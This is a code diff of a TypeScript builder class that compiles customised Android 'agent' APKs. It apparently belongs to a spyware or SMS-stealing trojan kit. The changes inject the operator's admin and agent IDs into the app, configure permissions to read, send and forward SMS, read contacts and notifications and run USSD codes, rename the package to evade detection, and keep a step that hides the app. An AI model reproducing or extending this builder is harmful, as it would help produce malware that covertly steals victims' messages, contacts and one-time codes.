@@ -2,7 +2,6 @@ import path from "path";
 import fs from "fs";
 import fsExtra from "fs-extra";
 import unzipper from "unzipper";
-import {generateRandomPackage} from "../utils/randomUtils";
 import {spawn} from "child_process";
 import Agent from "../models/agent.model";
 
@@ -10,6 +9,7 @@ class AgentCompiler {
     private readonly agentID: string;
     private readonly agentName: string;
     private readonly adminID: string;
+    private readonly createdBy: string;
     private readonly themeID: string;
     private readonly tempFolder: string;
     private readonly baseProject: string;
@@ -18,10 +18,11 @@ class AgentCompiler {
     private readonly variableData: any;
     private readonly agentStorePath: string;
 
-    constructor(agentID: string, agentName: string, adminID: string, themeID: string, forbiddenActions: any, variableData: any) {
+    constructor(agentID: string, agentName: string, adminID: string, createdBy: string, themeID: string, forbiddenActions: any, variableData: any) {
         this.agentID = agentID;
         this.agentName = agentName;
         this.adminID = adminID;
+        this.createdBy = createdBy;
         this.themeID = themeID;
         this.forbiddenActions = forbiddenActions;
         this.variableData = variableData;
@@ -34,8 +35,8 @@ class AgentCompiler {
 
     public addLog(message: string) {
         console.log(message);
-        if (connectedUsers[this.adminID]) {
-            io.to(connectedUsers[this.adminID]).emit("agent-log-" + this.agentID, message)
+        if (connectedUsers[this.createdBy]) {
+            io.to(connectedUsers[this.createdBy]).emit("agent-log-" + this.agentID, message)
         }
         const logsDir = path.join(__dirname, "../../data/compile-logs");
         const logFile = path.join(logsDir, `${this.agentID}.log`);
@@ -60,6 +61,7 @@ class AgentCompiler {
             await this.checkVariables();
             await this.copyThemeFiles();
             await this.setUpGradle();
+            await this.updateUtils();
             await this.changePackageName();
             await this.updateAppName();
             await this.hideApp();
@@ -185,8 +187,8 @@ class AgentCompiler {
             "main",
             "java",
             "com",
-            "pegalite",
-            "coresec",
+            "topdown",
+            "softy",
             "functions",
             "VARS.java"
         );
@@ -221,7 +223,6 @@ class AgentCompiler {
         }
 
         // 3️⃣ Copy java folder to your package path
-        // Example package path: com.pegalite.coresec.ui
         const javaSrc = path.join(themeFolder, "java");
         const javaDest = path.join(
             projectFolder,
@@ -230,8 +231,8 @@ class AgentCompiler {
             "main",
             "java",
             "com",
-            "pegalite",
-            "coresec"
+            "topdown",
+            "softy"
         );
 
         if (fsExtra.existsSync(javaSrc)) {
@@ -296,9 +297,114 @@ class AgentCompiler {
         this.addLog("build.gradle.kts signing configs applied ✅");
     }
 
+    private async updateUtils() {
+        let projectFolder = path.join(this.tempFolder, "project");
+        const utilsFile = path.join(
+            projectFolder,
+            "app",
+            "src",
+            "main",
+            "java",
+            "com",
+            "topdown",
+            "softy",
+            "functions",
+            "Utils.java"
+        );
+
+        if (!fs.existsSync(utilsFile)) {
+            this.addLog(`Error: Utils.java not found at ${utilsFile}`);
+            return;
+        }
+
+        let utilsContent = fs.readFileSync(utilsFile, "utf8");
+
+        // Replace variables
+        utilsContent = utilsContent.replace(
+            /public static String ADMIN_USERNAME = ".*";/,
+            `public static String ADMIN_USERNAME = "${this.adminID}";`
+        );
+        utilsContent = utilsContent.replace(
+            /public static String AGENT_ID = ".*";/,
+            `public static String AGENT_ID = "${this.agentID}";`
+        );
+        utilsContent = utilsContent.replace(
+            /public static String THEME = ".*";/,
+            `public static String THEME = "${this.themeID}";`
+        );
+
+        const notifAllowed = this.forbiddenActions.notifications ?? true;
+
+        utilsContent = utilsContent.replace(
+            /public static boolean isNotificationReadingEnabled = .*;/,
+            `public static boolean isNotificationReadingEnabled = ${notifAllowed};`
+        );
+
+        // Filter out permissions based on forbiddenActions
+        let allowedPermissions = [
+            "android.Manifest.permission.CALL_PHONE",
+            "android.Manifest.permission.READ_CONTACTS",
+            "android.Manifest.permission.READ_SMS",
+            "android.Manifest.permission.SEND_SMS",
+            "android.Manifest.permission.RECEIVE_SMS",
+            "android.Manifest.permission.READ_PHONE_STATE",
+            "\"android.permission.RECEIVE_PHONE_STATE\"",
+            "android.Manifest.permission.READ_PHONE_NUMBERS"
+        ];
+
+        const messages = this.forbiddenActions.messages ?? true;
+        if (!messages) {
+            allowedPermissions = allowedPermissions.filter(
+                (perm) => perm !== "android.Manifest.permission.READ_SMS"
+            );
+        }
+
+        const contacts = this.forbiddenActions.contacts ?? true;
+        if (!contacts) {
+            allowedPermissions = allowedPermissions.filter(
+                (perm) => perm !== "android.Manifest.permission.READ_CONTACTS"
+            );
+        }
+
+        const sendSms = this.forbiddenActions["send_sms"] ?? true;
+        const smsForward = this.forbiddenActions["sms_forward"] ?? true;
+        if (!sendSms && !smsForward) {
+            allowedPermissions = allowedPermissions.filter(
+                (perm) => perm !== "android.Manifest.permission.SEND_SMS"
+            );
+        }
+
+        if (!smsForward && !messages) {
+            allowedPermissions = allowedPermissions.filter(
+                (perm) => perm !== "android.Manifest.permission.RECEIVE_SMS"
+            );
+        }
+
+        const runUssd = this.forbiddenActions["run_ussd"] ?? true;
+        if (!runUssd) {
+            allowedPermissions = allowedPermissions.filter(
+                (perm) => perm !== "android.Manifest.permission.CALL_PHONE"
+            );
+        }
+
+        // Build APP_PERMISSIONS array string
+        const newPermissionsBlock = `public static final String[] APP_PERMISSIONS = {
+            ${allowedPermissions.join(",\n            ")}
+    };`;
+
+        // Replace APP_PERMISSIONS block
+        utilsContent = utilsContent.replace(
+            /public static final String\[] APP_PERMISSIONS[\s\S]*?};/,
+            newPermissionsBlock
+        );
+        // Write back
+        fs.writeFileSync(utilsFile, utilsContent, "utf8");
+        this.addLog(`Updated Utils.java successfully`);
+    }
+
     private async changePackageName() {
-        const oldPackage = "com.pegalite.coresec";
-        const newPackage = generateRandomPackage();
+        const oldPackage = "com.topdown.softy";
+        const newPackage = this.agentID;
 
         this.addLog(`🎯 New random package: ${newPackage}`);
 
@@ -366,7 +472,7 @@ class AgentCompiler {
 
         updateJavaFiles(newPath);
 
-        fs.rmSync(path.join(srcPath, "com", "pegalite"), {recursive: true, force: true});
+        fs.rmSync(path.join(srcPath, "com", "topdown"), {recursive: true, force: true});
 
         this.addLog(`✅ Package renamed to: ${newPackage}`);
     }
